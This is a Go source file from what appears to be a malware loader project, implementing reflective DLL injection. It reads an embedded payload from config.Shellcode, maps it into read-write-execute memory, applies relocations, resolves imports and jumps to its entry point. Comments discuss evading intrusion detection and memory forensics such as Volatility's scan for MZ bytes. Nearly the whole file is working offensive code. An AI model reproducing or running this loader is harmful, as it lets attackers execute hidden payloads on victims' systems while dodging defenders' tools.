package loader

import (
	"encoding/binary"
	"fmt"
	"friis/config"
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows"
)

/*
╔═══════════════════════════════════════════════════════════════════════════════════════════════════════╗
║                     Image Structures Necessary to Provide Proper DLL Mapping                          ║
╠═══════════════════════════════════════════════════════════════════════════════════════════════════════╣
║   Items Referenced:                                                                                   ║
║   ├── type IMAGE_OPTIONAL_HEADER64                                                                    ║
║   │    ├── EntryPoint (starting point of execution)                                                   ║
║   │    ├── BaseOfCode (base address where code is loaded)                                             ║
║   │    └── DataDirectory (points to import table, export table, etc.)                                 ║
║   │       ↕                                                                                           ║
║   ├── type IMAGE_DATA_DIRECTORY                                                                       ║
║   │    ├── ImportTable (points to the import descriptor)                                              ║
║   │    └── ExportTable (points to the export descriptor)                                              ║
║   │       ↕                                                                                           ║
║   ├── type IMAGE_FILE_HEADER                                                                          ║
║   │    ├── MachineType (the architecture of the machine, e.g., x86 or x64)                            ║
║   │    ├── NumberOfSections (number of sections in the DLL)                                           ║
║   │    └── Characteristics (flags to indicate whether the file is a DLL, executable, etc.)            ║
║   │       ↕                                                                                           ║
║   ├── type IMAGE_NT_HEADERS64                                                                         ║
║   │    ├── Signature (used to validate PE file)                                                       ║
║   │    ├── FileHeader (contains the IMAGE_FILE_HEADER)                                                ║
║   │    └── OptionalHeader (contains IMAGE_OPTIONAL_HEADER64)                                          ║
║   │       ↕                                                                                           ║
║   ├── type IMAGE_SECTION_HEADER                                                                       ║
║   │    ├── SectionName (name of the section, e.g., `.text`, `.data`, `.reloc`)                        ║
║   │    ├── VirtualSize (the size of the section in memory)                                            ║
║   │    ├── VirtualAddress (the offset of the section in memory)                                       ║
║   │    └── PointerToRawData (the file offset of the section data)                                     ║
║   │       ↕                                                                                           ║
║   ├── type BASE_RELOCATION_BLOCK                                                                      ║
║   │    ├── BlockSize (size of the block)                                                              ║
║   │    └── RelocationEntries (array of entries for address modification)                              ║
║   │       ↕                                                                                           ║
║   ├── type BASE_RELOCATION_ENTRY                                                                      ║
║   │    ├── VirtualAddress (address that needs to be relocated)                                        ║
║   │    ├── Type (type of relocation, e.g., absolute, high/low address)                                ║
║   │    └── Size (size of the relocation entry)                                                        ║
║   │       ↕                                                                                           ║
║   └── type IMAGE_IMPORT_DESCRIPTOR                                                                    ║
║        ├── Characteristics (time date stamp, DLL characteristics)                                     ║
║        ├── Name (name of the DLL being imported)                                                      ║
║        ├── FirstThunk (points to the imported function addresses)                                     ║
║        └── OriginalFirstThunk (points to the imported functions' RVA in the original file)            ║
╠═══════════════════════════════════════════════════════════════════════════════════════════════════════╣
║  https://www.scriptchildie.com/code-injection-techniques/dll-injection/2.-reflective-dll-injection    ║
╠═══════════════════════════════════════════════════════════════════════════════════════════════════════╣
║   Description:                                                                                        ║
║   ┌───────────────────────────────────────────────────────────────────────────────────────────────┐   ║
║   │ Reflective DLL injection requires careful handling of the PE file's structure.                │   ║
║   │ The process starts by reading the `IMAGE_NT_HEADERS64` to validate the file and extract       │   ║
║   │ essential information such as entry points and data directories (e.g., import table).         │   ║
║   │                                                                                               │   ║
║   │ The `IMAGE_FILE_HEADER` provides metadata about the file, including the number of sections.   │   ║
║   │ Each section (e.g., `.text`, `.data`) is described by the `IMAGE_SECTION_HEADER` and contains │   ║
║   │ details like its address in memory and file offset.                                           │   ║
║   │                                                                                               │   ║
║   │ For reflective DLL injection, the `BASE_RELOCATION_BLOCK` and `BASE_RELOCATION_ENTRY` are     │   ║
║   │ used│ to adjust memory addresses if the DLL is loaded at a different base address than        │   ║
║   │ expected.                                                                                     │   ║
║   │                                                                                               │   ║
║   │ The `IMAGE_IMPORT_DESCRIPTOR` handles resolving external imports by pointing to the origina   │   ║
║   │ address or thunk table of functions.                                                          │   ║
║   └───────────────────────────────────────────────────────────────────────────────────────────────┘   ║
╚═══════════════════════════════════════════════════════════════════════════════════════════════════════╝
*/

// IMAGE_OPTIONAL_HEADER64 represents the optional header for 64-bit architecture.
type IMAGE_OPTIONAL_HEADER64 struct {
	Magic                       uint16
	MajorLinkerVersion          uint8
	MinorLinkerVersion          uint8
	SizeOfCode                  uint32
	SizeOfInitializedData       uint32
	SizeOfUninitializedData     uint32
	AddressOfEntryPoint         uint32
	BaseOfCode                  uint32
	ImageBase                   uint64
	SectionAlignment            uint32
	FileAlignment               uint32
	MajorOperatingSystemVersion uint16
	MinorOperatingSystemVersion uint16
	MajorImageVersion           uint16
	MinorImageVersion           uint16
	MajorSubsystemVersion       uint16
	MinorSubsystemVersion       uint16
	Win32VersionValue           uint32
	SizeOfImage                 uint32
	SizeOfHeaders               uint32
	CheckSum                    uint32
	Subsystem                   uint16
	DllCharacteristics          uint16
	SizeOfStackReserve          uint64
	SizeOfStackCommit           uint64
	SizeOfHeapReserve           uint64
	SizeOfHeapCommit            uint64
	LoaderFlags                 uint32
	NumberOfRvaAndSizes         uint32

	DataDirectory [16]IMAGE_DATA_DIRECTORY
}

// IMAGE_DATA_DIRECTORY represents a data directory entry.
type IMAGE_DATA_DIRECTORY struct {
	VirtualAddress uint32
	Size           uint32
}

// IMAGE_FILE_HEADER represents the file header in the IMAGE_NT_HEADERS structure.
type IMAGE_FILE_HEADER struct {
	Machine              uint16
	NumberOfSections     uint16
	TimeDateStamp        uint32
	PointerToSymbolTable uint32
	NumberOfSymbols      uint32
	SizeOfOptionalHeader uint16
	Characteristics      uint16
}

type IMAGE_NT_HEADERS64 struct {
	Signature      uint32
	FileHeader     IMAGE_FILE_HEADER
	OptionalHeader IMAGE_OPTIONAL_HEADER64
}
type IMAGE_SECTION_HEADER struct {
	Name                 [8]byte
	VirtualSize          uint32
	VirtualAddress       uint32
	SizeOfRawData        uint32
	PointerToRawData     uint32
	PointerToRelocations uint32
	PointerToLinenumbers uint32
	NumberOfRelocations  uint16
	NumberOfLinenumbers  uint16
	Characteristics      uint32
}

type BASE_RELOCATION_BLOCK struct {
	PageAddress uint32
	BlockSize   uint32
}

// BASE_RELOCATION_ENTRY represents the base relocation entry structure
type BASE_RELOCATION_ENTRY struct {
	OffsetType uint16 // Combined field for Offset and Type
}

// Offset extracts the Offset from the combined field
func (bre BASE_RELOCATION_ENTRY) Offset() uint16 {
	return bre.OffsetType & 0xFFF
}

// Type extracts the Type from the combined field
func (bre BASE_RELOCATION_ENTRY) Type() uint16 {
	return (bre.OffsetType >> 12) & 0xF
}

type IMAGE_IMPORT_DESCRIPTOR struct {
	Characteristics uint32
	TimeDateStamp   uint32
	ForwarderChain  uint32
	Name            uint32
	FirstThunk      uint32
}

// uintptrToBytes converts a uintptr (pointer value) to a byte slice.
// It takes the pointer and creates a byte slice of the same size as the pointer.
// Each byte of the pointer value is copied into the byte slice and returned.
// This function is useful for converting pointers to a byte representation for memory manipulation.
func uintptrToBytes(ptr uintptr) []byte {
	ptrPointer := unsafe.Pointer(&ptr)
	byteSlice := make([]byte, unsafe.Sizeof(ptr))

	// Loop through each byte of the pointer and store it in the byte slice.
	for i := 0; i < int(unsafe.Sizeof(ptr)); i++ {
		byteSlice[i] = *(*byte)(unsafe.Pointer(uintptr(ptrPointer) + uintptr(i)))
	}

	return byteSlice
}

// getNtHeader extracts and returns the NT header of a DLL or executable from a given address.
// It reads the e_lfanew field at offset 0x3c from the shellcode address to get the address of the NT header.
// The function then returns a pointer to the IMAGE_NT_HEADERS64 structure at the calculated address.
func getNtHeader(shellcodeAddr uintptr) *IMAGE_NT_HEADERS64 {
	// Read the e_lfanew field, which points to the NT header.
	e_lfanew := *((*uint32)(unsafe.Pointer(shellcodeAddr + 0x3c)))
	// Return the pointer to the NT header structure.
	return (*IMAGE_NT_HEADERS64)(unsafe.Pointer(shellcodeAddr + uintptr(e_lfanew)))
}

// allocateDllMemory allocates memory for a DLL in the process's address space.
// It reserves and commits memory at the base address specified in the NT header's ImageBase field.
// The memory is allocated with execute, read, and write permissions, and the function returns the allocated base address.
// In case of an error, it logs the error and returns it.
func allocateDllMemory(ntHeader *IMAGE_NT_HEADERS64) (uintptr, error) {
	// Allocate memory at the base address with the specified size of the image.
	dllBaseAddr, err := windows.VirtualAlloc(
		uintptr(ntHeader.OptionalHeader.ImageBase),
		uintptr(ntHeader.OptionalHeader.SizeOfImage),
		windows.MEM_RESERVE|windows.MEM_COMMIT,
		windows.PAGE_EXECUTE_READWRITE,
	)
	// Return the allocated address and any error.
	return dllBaseAddr, err
}

// writeHeadersToMemory writes the headers of a DLL (e.g., PE headers) into the allocated memory space.
// It uses the WriteProcessMemory function to write the DLL's header data from the shellcode byte slice
// into the memory space starting at the DLL's base address. The number of bytes written is tracked in bytesWritten.
// If any error occurs during the write operation, it is logged and returned.
func writeHeadersToMemory(shellcode []byte, ntHeader *IMAGE_NT_HEADERS64, dllBaseAddr uintptr, bytesWritten uintptr) error {
	// Write the headers from shellcode into the allocated memory.
	err := windows.WriteProcessMemory(
		windows.CurrentProcess(), dllBaseAddr, &shellcode[0],
		uintptr(ntHeader.OptionalHeader.SizeOfHeaders), &bytesWritten,
	)
	// Return any error encountered during the write operation.
	return err
}

// writeSectionsToMemory writes the sections of a DLL to the allocated memory in the process's address space.
// It calculates the necessary offsets to traverse the DLL sections based on the provided NT header, shellcode address,
// and allocated DLL base address. For each section, it writes the raw section data to the memory and handles the
// .text section by making it executable. The function also logs any errors encountered while writing the sections.
func writeSectionsToMemory(shellcodeAddr uintptr, ntHeader *IMAGE_NT_HEADERS64, dllBaseAddr uintptr, bytesWritten uintptr) error {
	// Calculate the size of the header structures in the NT headers: Signature, Optional Header, and File Header.
	signatureSize := unsafe.Sizeof(ntHeader.Signature)
	optionalHeaderSize := unsafe.Sizeof(ntHeader.OptionalHeader)
	fileHeaderSize := unsafe.Sizeof(ntHeader.FileHeader)

	// Determine the e_lfanew (offset to the PE header) by calculating the difference between ntHeader and shellcodeAddr.
	e_lfanew := uintptr(unsafe.Pointer(ntHeader)) - shellcodeAddr

	// Calculate the section offset, which is the starting address of the section headers in the shellcode.
	sectionOffset := shellcodeAddr + uintptr(e_lfanew) + signatureSize + optionalHeaderSize + fileHeaderSize

	// Loop through each section in the DLL and write the section's data into the allocated memory.
	for i := 0; i < int(ntHeader.FileHeader.NumberOfSections); i++ {
		// Get the current section header from the calculated section offset.
		section := (*IMAGE_SECTION_HEADER)(unsafe.Pointer(sectionOffset))

		// Calculate the destination address in the allocated memory for this section, using its VirtualAddress.
		sectionDestination := dllBaseAddr + uintptr(section.VirtualAddress)

		// Retrieve the raw section data from the shellcode at the specified PointerToRawData offset.
		sectionData := (*byte)(unsafe.Pointer(shellcodeAddr + uintptr(section.PointerToRawData)))

		// Write the section's raw data to the allocated memory using WriteProcessMemory.
		err := windows.WriteProcessMemory(
			windows.CurrentProcess(),
			sectionDestination, sectionData,
			uintptr(section.SizeOfRawData),
			nil,
		)
		if err != nil {
			return err
		}

		// If the section is the .text section, change its memory protection to make it executable.
		if windows.ByteSliceToString(section.Name[:]) == ".text" {
			err = makeSectionExecutable(sectionDestination, uintptr(section.SizeOfRawData))
			if err != nil {
				// Return any error encountered while making the section executable.
				return err
			}
		}

		// Potentially, additional operations could be performed on sections to evade detection or analysis.
		// For example, "mangling" non-critical sections of the DLL while maintaining its execution functionality
		// could make it harder to scan by IDS.

		// Volatility, at a high level will scan through various memory regions described by Virtual Address Descriptors (VADs)
		// and look for any regions with PAGE_EXECUTE_READWRITE memory protection and then check for the magic bytes 4d5a (MZ in ASCII)
		// at the very beginning of those regions as those bytes signify the start of a Windows executable (i.e exe, dll):

		// Move to the next section by updating the section offset based on the size of the current section header.
		sectionOffset += unsafe.Sizeof(*section)
	}

	// Return nil if all sections are written successfully.
	return nil
}

// makeSectionExecutable modifies the protection of a memory section to make it executable.
// It uses the VirtualProtect function to change the memory protection of the specified section.
// The section is made executable with read access, and the previous protection is saved in the oldprotect variable.
// The function returns an error if VirtualProtect fails.
func makeSectionExecutable(sectionDestination uintptr, sectionSize uintptr) error {
	var oldprotect uint32
	// Change memory protection to executable and readable.
	err := windows.VirtualProtect(sectionDestination, sectionSize,
		windows.PAGE_EXECUTE_READ, &oldprotect)
	return err
}

// processRelocations processes the relocation entries of a DLL.
// It iterates through the relocation blocks in the optional header of the DLL's NT headers and applies necessary patches
// to the relocation addresses using the base offset. The relocation addresses are patched by calling patchRelocationAddress.
// If any errors occur while processing, they are reported and returned.
func processRelocations(dllBaseAddr uintptr, ntHeader *IMAGE_NT_HEADERS64, baseOffset uintptr) error {
	// Get the relocation data directory from the NT header.
	relocationData := ntHeader.OptionalHeader.DataDirectory[0x5]
	relocationTableAddr := uintptr(relocationData.VirtualAddress) + dllBaseAddr

	var processedRelocations int
	// Loop through the relocation blocks.
	for {
		relocationBlock := *(*BASE_RELOCATION_BLOCK)(unsafe.Pointer(uintptr(relocationTableAddr + uintptr(processedRelocations))))
		if relocationBlock.BlockSize == 0 && relocationBlock.PageAddress == 0 {
			// If the block is empty, exit the loop.
			break
		}

		// Calculate the number of relocation entries in the block and initialize them.
		relocationEntries := make([]BASE_RELOCATION_ENTRY, (relocationBlock.BlockSize-8)/2)
		relocationEntryAddr := relocationTableAddr + uintptr(processedRelocations) + 8

		// Read each relocation entry from the block.
		for i := 0; i < len(relocationEntries); i++ {
			relocationEntries[i] = *(*BASE_RELOCATION_ENTRY)(unsafe.Pointer(relocationEntryAddr + uintptr(i*2)))
		}

		// Process each relocation entry.
		for _, relocationEntry := range relocationEntries {
			if relocationEntry.Type() == 0 {
				// Skip if the relocation entry type is 0.
				continue
			}

			// Calculate the relocation address and patch it using the base offset.
			relocationRVA := relocationBlock.PageAddress + uint32(relocationEntry.Offset())
			relocationAddr := dllBaseAddr + uintptr(relocationRVA)
			err := patchRelocationAddress(relocationAddr, baseOffset)
			if err != nil {
				return err
			}
		}

		// Move to the next relocation block.
		processedRelocations += int(relocationBlock.BlockSize)
	}
	return nil
}

// patchRelocationAddress modifies the relocation address by adding the base offset.
// It reads the current value at the relocation address, adds the base offset, and writes the patched value back.
// If any errors occur during reading or writing, they are logged and returned.
func patchRelocationAddress(relocationAddr uintptr, baseOffset uintptr) error {
	var size uintptr
	byteSlice := make([]byte, unsafe.Sizeof(size))
	// Read the current relocation address from memory.
	err := windows.ReadProcessMemory(
		windows.CurrentProcess(), relocationAddr,
		&byteSlice[0], unsafe.Sizeof(size), nil,
	)
	if err != nil {
		return err
	}

	// Add the base offset to the current relocation address.
	addressToPatch := uintptr(binary.LittleEndian.Uint64(byteSlice)) + baseOffset
	patchData := uintptrToBytes(addressToPatch)

	// Write the patched address back to memory.
	err = windows.WriteProcessMemory(
		windows.CurrentProcess(), relocationAddr,
		&patchData[0], uintptr(len(patchData)), nil,
	)
	return err
}

// processImports processes the import directory of a DLL.
// It loads the libraries specified in the import descriptor, resolves the function addresses,
// and writes them back to the memory. It continues this process for each import descriptor until all imports are resolved.
// Any errors encountered during the process are logged and returned.
func processImports(dllBaseAddr uintptr, ntHeader *IMAGE_NT_HEADERS64) error {
	// Get the import data directory from the NT header.
	importsDir := ntHeader.OptionalHeader.DataDirectory[0x1]
	importDescriptorAddr := dllBaseAddr + uintptr(importsDir.VirtualAddress)

	// Loop through each import descriptor.
	for {
		importDescriptor := *(*IMAGE_IMPORT_DESCRIPTOR)(unsafe.Pointer(importDescriptorAddr))
		if importDescriptor.Name == 0 {
			// If the descriptor is empty, exit the loop.
			break
		}

		// Get the DLL name and load the library.
		libraryNameAddr := dllBaseAddr + uintptr(importDescriptor.Name)
		dllName := windows.BytePtrToString((*byte)(unsafe.Pointer(libraryNameAddr)))
		hLibrary, err := windows.LoadLibrary(dllName)
		if err != nil {
			return err
		}

		// Process the function thunks for this library.
		functionAddr := dllBaseAddr + uintptr(importDescriptor.FirstThunk)
		for {
			// Read the thunk value from memory.
			thunk := *(*uint16)(unsafe.Pointer(functionAddr))
			if thunk == 0 {
				// If the thunk is 0, all functions have been processed for this descriptor.
				break
			}

			// Get the function name and resolve the address.
			funcNameAddr := dllBaseAddr + uintptr(thunk+2)
			funcName := windows.BytePtrToString((*byte)(unsafe.Pointer(funcNameAddr)))
			proc, err := windows.GetProcAddress(hLibrary, funcName)
			if err != nil {
				return err
			}

			// Convert the function address to bytes and write it to memory.
			procBytes := uintptrToBytes(proc)
			err = windows.WriteProcessMemory(
				windows.CurrentProcess(), functionAddr, &procBytes[0],
				uintptr(len(procBytes)), nil,
			)
			if err != nil {
				return err
			}
			// Move to the next thunk.
			functionAddr += 0x8
		}
		// Move to the next import descriptor.
		importDescriptorAddr += 0x14
	}
	return nil
}

func ReflectiveDLLInjection() bool {
	shellcode := config.Shellcode
	shellcodeAddr := uintptr(unsafe.Pointer(&shellcode[0]))
	ntHeader := getNtHeader(shellcodeAddr)
	var bytesWritten uintptr

	fmt.Printf("Loaded shellcode of size: %d at 0x%x\n", len(shellcode), shellcodeAddr)
	fmt.Printf("Image base at: 0x%x, Image size: 0x%x\n", ntHeader.OptionalHeader.ImageBase, ntHeader.OptionalHeader.SizeOfImage)

	dllBaseAddr, err := allocateDllMemory(ntHeader)
	if err != nil {
		return false
	}

	err = writeHeadersToMemory(shellcode, ntHeader, dllBaseAddr, bytesWritten)
	if err != nil {
		return false
	}

	err = writeSectionsToMemory(shellcodeAddr, ntHeader, dllBaseAddr, bytesWritten)
	if err != nil {
		return false
	}

	baseOffset := dllBaseAddr - uintptr(ntHeader.OptionalHeader.ImageBase)
	err = processRelocations(dllBaseAddr, ntHeader, baseOffset)
	if err != nil {
		return false
	}

	err = processImports(dllBaseAddr, ntHeader)
	if err != nil {
		return false
	}

	syscall.SyscallN(dllBaseAddr+uintptr(ntHeader.OptionalHeader.AddressOfEntryPoint), dllBaseAddr, 0x1, 0)
	err = windows.VirtualFree(dllBaseAddr, 0x0, windows.MEM_RELEASE)

	return err == nil
}
